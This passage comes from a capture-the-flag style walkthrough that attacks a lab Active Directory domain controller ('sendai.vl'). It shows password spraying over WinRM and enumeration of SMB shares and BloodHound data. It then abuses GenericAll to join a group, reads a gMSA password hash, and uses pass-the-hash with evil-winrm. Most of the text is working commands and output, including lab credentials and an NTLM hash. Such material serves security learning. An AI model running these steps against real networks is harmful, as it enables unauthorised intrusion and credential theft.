WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Administrator:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Anthony.Smith:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Clifford.Davey:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\DC$:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Declan.Jenkins:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Dorothy.Jones:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Elliot.Yates:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Guest:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Jason.Brady:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kathleen.Kelly:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kerry.Robinson:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\krbtgt:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lawrence.Grant:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Leslie.Johnson:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lisa.Williams:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Malcolm.Smith:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Marie.Gallagher:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Megan.Edwards:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\mgtsvc$:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Naomi.Gardner:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Norman.Baxter:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Ross.Sullivan:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Stephen.Simpson:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Susan.Harper:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Thomas.Powell:SurenessBlob85  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\websvc:SurenessBlob85  
>  nxc winrm 10.129.234.66 -u sendai_users.txt -p 'SurenessBlob85;'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Administrator:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Anthony.Smith:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Clifford.Davey:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\DC$:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Declan.Jenkins:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Dorothy.Jones:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Elliot.Yates:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Guest:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Jason.Brady:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kathleen.Kelly:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kerry.Robinson:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\krbtgt:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lawrence.Grant:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Leslie.Johnson:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lisa.Williams:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Malcolm.Smith:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Marie.Gallagher:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Megan.Edwards:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\mgtsvc$:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Naomi.Gardner:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Norman.Baxter:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Ross.Sullivan:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Stephen.Simpson:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Susan.Harper:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Thomas.Powell:SurenessBlob85;  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\websvc:SurenessBlob85;  
>  nxc winrm 10.129.234.66 -u sendai_users.txt -p 'SurenessBlob85;%'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Administrator:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Anthony.Smith:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Clifford.Davey:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\DC$:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Declan.Jenkins:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Dorothy.Jones:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Elliot.Yates:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Guest:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Jason.Brady:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kathleen.Kelly:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Kerry.Robinson:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\krbtgt:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lawrence.Grant:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Leslie.Johnson:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Lisa.Williams:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Malcolm.Smith:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Marie.Gallagher:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Megan.Edwards:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\mgtsvc$:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Naomi.Gardner:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Norman.Baxter:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Ross.Sullivan:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Stephen.Simpson:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Susan.Harper:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Thomas.Powell:SurenessBlob85;%  
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\websvc:SurenessBlob85;%
```

We'll try with Thomas.Powell :

```PowerShell
>  evil-winrm -i 10.129.234.66 -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\> dir
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError  
                                          
Error: Exiting with code 1
```

Crashed.

```bash
>  nxc winrm 10.129.234.66 -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1
```

It seems like the shell is innaccessible.

```bash
>  nxc smb dc.sendai.vl -u sqlsvc -p 'SurenessBlob85' --shares  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.66   445    DC               [+] sendai.vl\sqlsvc:SurenessBlob85    
SMB         10.129.234.66   445    DC               [*] Enumerated shares  
SMB         10.129.234.66   445    DC               Share           Permissions     Remark  
SMB         10.129.234.66   445    DC               -----           -----------     ------  
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.66   445    DC               C$                              Default share  
SMB         10.129.234.66   445    DC               config          READ,WRITE         
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share  
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share    
SMB         10.129.234.66   445    DC               Users           READ
```

`nxc smb` confirms that `sqlsvc:SurenessBlob85` are right credentials, but the rights on the shares are the same as for `Thomas.Powell`.

We'll use `bloodhound-ce-python` with Thomas' creds to collect all data `-c All` on a clean zip file that we can open on `Bloodhound` :

```bash
> bloodhound-ce-python -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -d sendai.vl -ns
10.129.234.66 -c All --zip -op scrow_thomas_sendai
  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: sendai.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.sendai.vl  
INFO: Testing resolved hostname connectivity dead:beef::a5b7:9775:1ca4:7fa6  
INFO: Trying LDAP connection to dead:beef::a5b7:9775:1ca4:7fa6  
INFO: Testing resolved hostname connectivity dead:beef::1ee  
INFO: Trying LDAP connection to dead:beef::1ee  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.sendai.vl  
INFO: Testing resolved hostname connectivity dead:beef::a5b7:9775:1ca4:7fa6  
INFO: Trying LDAP connection to dead:beef::a5b7:9775:1ca4:7fa6  
INFO: Testing resolved hostname connectivity dead:beef::1ee  
INFO: Trying LDAP connection to dead:beef::1ee  
INFO: Found 27 users  
INFO: Found 57 groups  
INFO: Found 2 gpos  
INFO: Found 5 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.sendai.vl  
INFO: Done in 00M 47S  
INFO: Compressing output into 20260526121046_bloodhound.zip
```

We open `bloodhound` and import the data inside, for some reason the upload blocks at computers.json

We use nxc with `spider_plus` to download all the files in smb that Thomas can :

```bash
>  nxc smb dc.sendai.vl -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -M spider_plus -o DOWNLOAD_FLAG=True  
  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1    
SPIDER_PLUS 10.129.234.66   445    DC               [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.129.234.66   445    DC               [*]  DOWNLOAD_FLAG: True  
SPIDER_PLUS 10.129.234.66   445    DC               [*]     STATS_FLAG: True  
SPIDER_PLUS 10.129.234.66   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.129.234.66   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.129.234.66   445    DC               [*]  MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.129.234.66   445    DC               [*]  OUTPUT_FOLDER: /home/vagabond/.nxc/modules/nxc_spider_plus  
SMB         10.129.234.66   445    DC               [*] Enumerated shares  
SMB         10.129.234.66   445    DC               Share           Permissions     Remark  
SMB         10.129.234.66   445    DC               -----           -----------     ------  
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.66   445    DC               C$                              Default share  
SMB         10.129.234.66   445    DC               config          READ,WRITE         
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share  
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share    
SMB         10.129.234.66   445    DC               Users           READ               
SPIDER_PLUS 10.129.234.66   445    DC               [+] Saved share-file metadata to "/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66.json".  
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, config, IPC$, NETLOGON, sendai, SYSVOL, Users)  
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Readable Shares:  6 (config, IPC$, NETLOGON, sendai, SYSVOL, Users)  
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Writable Shares:  2 (config, sendai)  
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Filtered Shares:  1  
SPIDER_PLUS 10.129.234.66   445    DC               [*] Total folders found:  87  
SPIDER_PLUS 10.129.234.66   445    DC               [*] Total files found:    76  
SPIDER_PLUS 10.129.234.66   445    DC               [*] Files filtered:       43  
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size average:    67.11 KB  
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size min:        3 B  
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size max:        2.65 MB  
SPIDER_PLUS 10.129.234.66   445    DC               [*] File unique exts:     16 (txt, zfsendtotarget, exe, inf, dat, lnk, blf, log1, library-ms, desklink...)  
SPIDER_PLUS 10.129.234.66   445    DC               [*] Downloads successful: 33  
SPIDER_PLUS 10.129.234.66   445    DC               [+] All files processed successfully.
```

Bloodhound is still stuck at 0% downloading computers.json.

We try to grep what we got from `spider_plus` :

```bash
>  jq -r 'to_entries[] | "\(.key): \(.value | keys | length) paths"' /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66.json  
  
NETLOGON: 0 paths  
SYSVOL: 5 paths  
Users: 66 paths  
config: 1 paths  
sendai: 4 paths  
>  rg -i '\.(txt|xml|ini|config|bat|ps1|sql|json|yml|yaml|rdp|kdbx)$' /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66.json | head -40  
  
>  rg -i 'password|passwd|pwd|secret|User Id|connectionstring|BEGIN OPENSSH|\.rdp' /home/vagabond/.nxc/modules/nxc_spider_plus/ -g '!*.exe' -g '!*.lnk' 2>/dev/null  
  
/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/sendai/security/guidelines.txt  
30:2.1. Password Security:  
31:a. Users must choose strong passwords that are difficult to guess.  
32:b. Passwords should be changed regularly and not shared with others.  
33:c. Users should never write down their passwords or store them in easily accessible locations.  
  
/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/sendai/incident.txt  
3:We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a  
significant number of user accounts have weak and insecure passwords.  
5:To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a preca  
utionary measure. This means that affected users will be required to change their passwords upon their next login.  
7:We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safegua  
rding sensitive information and protecting our network from potential threats.  
9:If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process an  
d provide any necessary support.  
  
/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/SYSVOL/sendai.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  
4:MinimumPasswordAge = 1  
5:MaximumPasswordAge = 42  
6:MinimumPasswordLength = 7  
7:PasswordComplexity = 1  
8:PasswordHistorySize = 24  
10:RequireLogonToChangePassword = 0  
12:ClearTextPassword = 0  
>  jq -r '.. | objects | select(has("size")) | "\(.size)\t\(.path // .name // "?")"' /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66.json 2>/dev/null | sort -hr | head -20  
  
1021 B  ?  
1015 B  ?  
1015 B  ?  
1015 B  ?  
1015 B  ?  
1015 B  ?  
999 B   ?  
941 B   ?  
934 B   ?  
813.94 KB       ?  
568 B   ?  
512 KB  ?  
512 KB  ?  
440 B   ?  
409 B   ?  
407 B   ?  
405 B   ?  
380 B   ?  
380 B   ?  
380 B   ?  
>  find /home/vagabond/.nxc/modules/nxc_spider_plus/ -type f ! -name '*.json' -printf '%s\t%p\n' | sort -nr | head -20  
  
25308   /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Local/Microsoft/Windows/PowerShell/StartupProfileData-Interactive  
20480   /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/NTUSER.DAT.LOG2  
6078    /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/SYSVOL/sendai.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  
4538    /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/sendai/security/guidelines.txt  
2788    /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/SYSVOL/sendai.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol  
1372    /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/sendai/incident.txt  
1098    /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/SYSVOL/sendai.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  
999     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Libraries/RecordedTV.library-ms  
941     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini  
934     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini  
568     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini  
440     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini  
380     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Videos/desktop.ini  
380     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Pictures/desktop.ini  
380     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Music/desktop.ini  
325     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini  
278     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Documents/desktop.ini  
270     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini  
196     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/AccountPictures/desktop.ini  
175     /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.234.66/Users/Public/Libraries/desktop.ini
```

Since we got nothing and Bloodhound is still stuck, we'll try LDAP :

```bash
>  nxc ldap dc.sendai.vl -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -M groupmembership -o USER='Thomas.Powell'  
  
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)    
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1    
GROUPMEM... 10.129.234.66   389    DC               [+] User: Thomas.Powell is member of following groups:    
GROUPMEM... 10.129.234.66   389    DC               support  
GROUPMEM... 10.129.234.66   389    DC               staff  
GROUPMEM... 10.129.234.66   389    DC               Domain Users
```

We can see we are in `support` `staff` and `Domain Users`.

Since Bloodhound is still stuck, we close it, and re-run `bloodhound-ce-python` this time with the `-dc` argument and the domain control name :

```bash
bloodhound-ce-python -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -d sendai.vl -dc dc.sendai.vl -ns 10.129.234.66 -c All --zip -op scrow_thomas_sendai
```

It uploads everything again, except for computers.json, we'll have to do without it.

On `Bloodhound` we see that Thomas is a member of `SUPPORT@SENDAI.VL` (like in the group membership search) and that this group has `GenericAll` to `ADMSVC@SENDAI.VL`

```bash
b>  bloodyad --host 10.129.234.66 -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -d sendai.vl add groupMember ADMSVC thomas.powell  
/usr/share/bloodyad/bloodyAD/network/ldap.py:715: SyntaxWarning: 'return' in a 'finally' block  
 return search_results  
/usr/share/bloodyad/bloodyAD/network/ldap.py:770: SyntaxWarning: 'return' in a 'finally' block  
 return search_result  
[+] thomas.powell added to ADMSVC
```

Then we verify if our Thomas was added to `admsvc` :

```bash
>  nxc ldap dc.sendai.vl -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' -M groupmembership -o USER='Thomas.Powell'  
  
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)    
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1    
GROUPMEM... 10.129.234.66   389    DC               [+] User: Thomas.Powell is member of following groups:    
GROUPMEM... 10.129.234.66   389    DC               support  
GROUPMEM... 10.129.234.66   389    DC               admsvc  
GROUPMEM... 10.129.234.66   389    DC               staff  
GROUPMEM... 10.129.234.66   389    DC               Domain Users
```

So now we return to Bloodhound and we see that `ADMSVC@SENDAI.VL` has `ReadGMSAPassword` on `MGTSVC@SENDAI.VL` who seems to be a user.

We'll read the GMSA password as Thomas who is now part of `admsvc` :

```bash
>  nxc ldap dc.sendai.vl -u 'Thomas.Powell' -p 'ScrowSendaiXYZ1' --gmsa  
  
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)    
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1    
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords  
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: f30c842007f4e278d504b7397a9e76e3     PrincipalsAllowedToReadPassword: admsvc
```

We got a hash : `f30c842007f4e278d504b7397a9e76e3` however it doesn't look like a NTLMv2 hash, so we'll just use Pass-The-Hash to get a shell :

```PowerShell
>  evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H f30c842007f4e278d504b7397a9e76e3  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> dir  
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd \  
*Evil-WinRM* PS C:\> dir  
  
  
   Directory: C:\  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         5/26/2026   3:55 AM                config  
d-----         4/15/2025   8:20 PM                inetpub  
d-----          5/8/2021   1:20 AM                PerfLogs  
d-r---         4/15/2025   7:51 PM                Program Files  
d-----         7/18/2023   6:11 AM                Program Files (x86)  
d-----         5/26/2026   3:55 AM                sendai  
d-----         7/11/2023   2:35 AM                SQL2019  
d-r---         5/26/2026   4:10 AM                Users  
d-----         8/18/2025   5:04 AM                Windows  
-a----         4/15/2025   8:27 PM             32 user.txt  
  
  
*Evil-WinRM* PS C:\> cat user.txt  
fff3359************7cd3e
```

And we got the user flag !

Then, we try to get information :

```PowerShell
*Evil-WinRM* PS C:\> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  

*Evil-WinRM* PS C:\> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                         Attributes  
=========================================== ================ =========================================== ==================================================  
SENDAI\Domain Computers                     Group            S-1-5-21-3085872742-570972823-736764132-515 Mandatory group, Enabled by default, Enabled group  
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
*Evil-WinRM* PS C:\> whoami  
sendai\mgtsvc$
*Evil-WinRM* PS C:\> hostname  
dc

*Evil-WinRM* PS C:\> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\Services |  
 ForEach-Object { Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue } |  
 Select-Object PSChildName, ImagePath |  
 Where-Object { $_.ImagePath -match '\.exe' -and $_.ImagePath -notmatch 'svchost' } |  
 Format-Table -Wrap  
  
PSChildName                              ImagePath  
-----------                              ---------  
ADWS                                     C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe  
ALG                                      C:\Windows\System32\alg.exe  
Amazon EC2Launch                         "C:\Program Files\Amazon\EC2Launch\service\EC2LaunchService.exe"  
AmazonSSMAgent                           "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"  
AppVClient                               C:\Windows\system32\AppVClient.exe  
aspnet_state                             C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe  
AWSLiteAgent                             "C:\Program Files\Amazon\XenTools\LiteAgent.exe"  
CertSvc                                  C:\Windows\system32\certsrv.exe  
COMSysApp                                C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}  
CredentialEnrollmentManagerUserSvc       C:\Windows\system32\CredentialEnrollmentManager.exe  
